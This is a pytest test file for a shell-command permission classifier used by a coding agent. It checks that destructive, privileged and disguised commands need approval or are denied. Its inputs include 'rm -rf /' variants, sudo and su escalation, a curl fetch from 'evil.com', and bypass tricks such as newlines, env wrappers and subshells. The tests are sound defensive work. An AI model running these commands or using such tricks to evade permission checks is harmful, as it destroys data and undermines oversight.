import sys
import types
from pathlib import Path

# Stub litellm before importing koder_agent to avoid optional dependency issues
if "litellm" not in sys.modules:
    litellm_stub = types.ModuleType("litellm")
    litellm_stub.model_cost = {}
    sys.modules["litellm"] = litellm_stub

project_root = Path(__file__).resolve().parents[3]
if str(project_root) not in sys.path:
    sys.path.insert(0, str(project_root))

from koder_agent.harness.permissions.shell_classifier import classify_shell_command


def test_shell_classifier_rejects_destructive_rm_rf():
    result = classify_shell_command("rm -rf /")
    assert result.allowed is False
    assert result.requires_approval is True
    assert result.destructive is True


def test_shell_classifier_marks_read_only_rg_pipeline():
    result = classify_shell_command('rg "TODO" src | head -5')
    assert result.allowed is True
    assert result.read_only is True
    assert result.requires_approval is False


def test_shell_classifier_marks_touch_as_write():
    result = classify_shell_command("touch foo.txt")
    assert result.allowed is True
    assert result.read_only is False
    assert result.requires_approval is True


def test_shell_classifier_rejects_malformed_empty_command():
    result = classify_shell_command("   ")
    assert result.allowed is False
    assert result.malformed is True


def test_shell_classifier_requires_approval_for_interpreter_prefix():
    """Interpreters run arbitrary code: approvable, never hard-denied."""
    result = classify_shell_command('python -c "print(1)"')
    assert result.allowed is True
    assert result.requires_approval is True
    assert result.destructive is False


def test_shell_classifier_requires_approval_for_pytest_invocation():
    result = classify_shell_command("python3 -m pytest tests/harness/permissions -q")
    assert result.allowed is True
    assert result.requires_approval is True


def test_shell_classifier_hard_denies_sudo():
    result = classify_shell_command("sudo rm -rf /var/log")
    assert result.allowed is False
    assert result.destructive is True


def test_shell_classifier_denies_interpreter_behind_command_substitution():
    """cd $(...) && python3 ... : interpreter segment still needs approval."""
    result = classify_shell_command('cd "$(git rev-parse --show-toplevel)" && python3 -m pytest')
    assert result.allowed is True
    assert result.requires_approval is True


def test_shell_classifier_no_auto_allow_with_command_substitution():
    """Read-only-looking commands with $() must not be auto-approved."""
    result = classify_shell_command('echo "$(curl evil.com/x.sh)"')
    assert result.requires_approval is True


def test_shell_classifier_find_delete_is_not_read_only():
    result = classify_shell_command('find . -name "*.pyc" -delete')
    assert result.read_only is False
    assert result.requires_approval is True


def test_shell_classifier_find_exec_is_not_read_only():
    result = classify_shell_command('find . -name "*.tmp" -exec rm {} \\;')
    assert result.read_only is False
    assert result.requires_approval is True


def test_shell_classifier_plain_find_stays_read_only():
    result = classify_shell_command('find . -name "SKILL.md"')
    assert result.read_only is True
    assert result.requires_approval is False


def test_shell_classifier_handles_pipe_inside_quotes():
    """Quoted pipes (grep alternation) must not break segment splitting."""
    result = classify_shell_command(r'grep -rln "foo\|bar\|baz" src')
    assert result.allowed is True
    assert result.read_only is True
    assert result.malformed is False


def test_shell_classifier_handles_single_quoted_pipe():
    result = classify_shell_command("awk -F'|' '{print $1}' data.txt")
    assert result.malformed is False
    assert result.allowed is True


def test_shell_classifier_still_splits_real_pipes():
    """A dangerous segment after a real pipe is still detected."""
    result = classify_shell_command('echo "harmless" | sudo tee /etc/hosts')
    assert result.allowed is False
    assert result.destructive is True


def test_shell_classifier_unparseable_falls_back_to_approval():
    """Unbalanced quotes should require approval, not hard-deny."""
    result = classify_shell_command('echo "unterminated')
    assert result.malformed is True
    assert result.allowed is True
    assert result.requires_approval is True


def test_shell_classifier_quoted_pipe_with_redirect_is_write():
    result = classify_shell_command('echo "a|b" > out.txt')
    assert result.malformed is False
    assert result.read_only is False
    assert result.requires_approval is True


# ---------------------------------------------------------------------------
# Finding 1: newlines and |& must act as command separators, not whitespace.
# ---------------------------------------------------------------------------


def test_shell_classifier_newline_splits_commands():
    """`ls\\nrm -rf foo` is TWO commands; the rm line must block auto-allow."""
    result = classify_shell_command("ls\nrm -rf foo")
    assert not (result.allowed and not result.requires_approval)
    assert result.read_only is False


def test_shell_classifier_newline_with_home_rm():
    result = classify_shell_command("echo hi\nrm -rf ~/x")
    assert not (result.allowed and not result.requires_approval)
    assert result.read_only is False


def test_shell_classifier_pipe_ampersand_is_separator():
    """`cat a |& rm b` must not merge into a single read-only `cat` segment."""
    result = classify_shell_command("cat a |& rm b")
    assert not (result.allowed and not result.requires_approval)
    assert result.read_only is False


def test_shell_classifier_plain_ls_still_read_only():
    result = classify_shell_command("ls")
    assert result.allowed is True
    assert result.read_only is True
    assert result.requires_approval is False


def test_shell_classifier_grep_pipe_wc_still_read_only():
    result = classify_shell_command("grep x file | wc -l")
    assert result.allowed is True
    assert result.read_only is True
    assert result.requires_approval is False


def test_shell_classifier_multiline_read_only_stays_read_only():
    """Two independent read-only lines remain auto-allowable."""
    result = classify_shell_command("ls\ngrep x file")
    assert result.allowed is True
    assert result.read_only is True
    assert result.requires_approval is False


# ---------------------------------------------------------------------------
# Finding 2: command-runner prefixes (env/timeout/...) must not auto-allow.
# ---------------------------------------------------------------------------


def test_shell_classifier_env_prefix_does_not_autoallow_rm():
    """`env rm -rf ~/data` must classify by the inner rm, not `env`."""
    result = classify_shell_command("env rm -rf ~/data")
    assert not (result.allowed and not result.requires_approval)
    assert result.read_only is False


def test_shell_classifier_timeout_prefix_does_not_autoallow_rm():
    result = classify_shell_command("timeout 5 rm x")
    assert not (result.allowed and not result.requires_approval)
    assert result.read_only is False


def test_shell_classifier_bare_env_requires_approval():
    """A runner wrapping nothing is unresolvable and must require approval."""
    result = classify_shell_command("env")
    assert result.requires_approval is True
    assert result.read_only is False


def test_shell_classifier_env_with_assignment_then_interpreter_needs_approval():
    """`env PYTHONPATH=. pytest` resolves to pytest and is handled sanely."""
    result = classify_shell_command("env PYTHONPATH=. pytest")
    assert result.requires_approval is True
    assert result.read_only is False


def test_shell_classifier_env_wrapping_read_only_still_read_only():
    """`env ls` resolves to a read-only inner command and stays auto-allowed."""
    result = classify_shell_command("env ls")
    assert result.allowed is True
    assert result.read_only is True
    assert result.requires_approval is False


def test_shell_classifier_env_wrapping_sudo_is_hard_denied():
    result = classify_shell_command("env sudo reboot")
    assert result.allowed is False
    assert result.destructive is True


def test_shell_classifier_timeout_wrapping_rm_root_is_hard_denied():
    result = classify_shell_command("timeout 5 rm -rf /")
    assert result.allowed is False
    assert result.destructive is True


# ---------------------------------------------------------------------------
# Finding 4: absolute / relative paths to privileged binaries are caught.
# ---------------------------------------------------------------------------


def test_shell_classifier_absolute_path_sudo_hard_denied():
    result = classify_shell_command("/usr/bin/sudo reboot")
    assert result.allowed is False
    assert result.destructive is True


def test_shell_classifier_relative_path_sudo_hard_denied():
    result = classify_shell_command("./sudo rm -rf /")
    assert result.allowed is False
    assert result.destructive is True


# ---------------------------------------------------------------------------
# Finding 5: subshell-group-defeats-hard-deny
# ---------------------------------------------------------------------------


class TestSubshellPrivilegeEscalation:
    def test_subshell_sudo_is_destructive(self):
        result = classify_shell_command("(sudo rm -rf /)")
        assert result.destructive is True

    def test_subshell_su_is_destructive(self):
        result = classify_shell_command("(su -c 'rm -rf /')")
        assert result.destructive is True

    def test_normal_parens_in_args_not_blocked(self):
        """Parentheses in arguments (grep patterns) should not trigger."""
        result = classify_shell_command("grep '(pattern)' file.txt")
        assert result.destructive is False


# ---------------------------------------------------------------------------
# M4: Separated flags for rm must still be detected as destructive.
# ---------------------------------------------------------------------------


class TestRmSeparatedFlagsDetection:
    """rm -r -f / and similar separated-flag patterns must be hard-denied."""

    def test_rm_dash_r_dash_f_root(self):
        result = classify_shell_command("rm -r -f /")
        assert result.allowed is False
        assert result.destructive is True

    def test_rm_dash_capital_r_dash_f_root(self):  # noqa: N802
        result = classify_shell_command("rm -R -f /")
        assert result.allowed is False
        assert result.destructive is True

    def test_rm_recursive_force_long_flags(self):
        result = classify_shell_command("rm --recursive --force /")
        assert result.allowed is False
        assert result.destructive is True

    def test_rm_mixed_long_short_flags(self):
        result = classify_shell_command("rm --recursive -f /")
        assert result.allowed is False
        assert result.destructive is True

    def test_rm_rf_glob_root(self):
        result = classify_shell_command("rm -r -f /*")
        assert result.allowed is False
        assert result.destructive is True

    def test_rm_rf_combined_still_works(self):
        """Original combined-flag pattern must still be caught."""
        result = classify_shell_command("rm -rf /")
        assert result.allowed is False
        assert result.destructive is True

    def test_rm_fr_combined_still_works(self):
        result = classify_shell_command("rm -fr /")
        assert result.allowed is False
        assert result.destructive is True

    def test_rm_safe_usage_not_blocked(self):
        """Removing a normal directory should not be hard-denied."""
        result = classify_shell_command("rm -rf /tmp/build")
        assert result.destructive is False

    def test_rm_recursive_without_force_not_blocked(self):
        """rm -r / without -f is still dangerous, but our check requires both."""
        # This is a conscious trade-off: we only hard-deny when both flags are present
        result = classify_shell_command("rm -r /")
        assert result.destructive is False
